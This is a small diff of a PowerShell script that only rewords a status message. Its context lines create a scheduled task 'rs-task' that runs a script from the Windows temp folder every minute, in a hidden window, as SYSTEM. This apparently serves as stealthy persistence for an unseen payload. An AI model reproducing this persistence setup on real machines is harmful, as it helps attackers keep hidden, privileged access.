@@ -5,7 +5,7 @@ $taskExists = Get-ScheduledTask | Where-Object {$_.TaskName -like "rs-task" }
 if($taskExists) {
    Write-Output "EXISTS";
 } else {
-   Write-Output "Doesnt Exist: Creating task.";
+   Write-Output "Creating task...";
    C:\Windows\System32\schtasks.exe /create /tn rs-task /tr "powershell -NoLogo -WindowStyle hidden -file C:\Windows\Temp\rs_sl.ps1" /sc minute /mo 1 /ru System
 }
 
